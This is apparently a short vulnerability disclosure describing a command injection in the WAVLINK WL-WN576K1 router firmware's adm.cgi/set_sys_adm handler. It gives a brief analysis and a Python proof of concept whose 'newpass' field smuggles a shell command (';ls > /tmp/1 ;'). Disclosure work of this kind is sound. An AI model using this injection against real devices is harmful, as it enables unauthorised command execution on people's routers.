# command injection

## WAVLINK_WL_WN576K1

version: 20220801

## Description:

There is a command injection in adm.cgi/set_sys_adm

## Source:

you may download it from : 

[WL-WN576K1 - WAVLINK See the world! Powered by Wavlink](https://www.wavlink.com/en_us/firmware/details/5ce8519bd8.html)

## Analyse:

![](1.png)

get value from newpass

![](2.png)

if value from SYSPASS is correct, get into else

![](3.png)

finally call system, cause command injection

## POC

```
url = "http://192.168.0.1/cgi-bin/adm.cgi"
payload = ';ls > /tmp/1  ;' + '\n'

r = requests.post(url, data={ 'page':'sysAdm', 'newpass': + payload,'SYSPASS':'yours'})
```
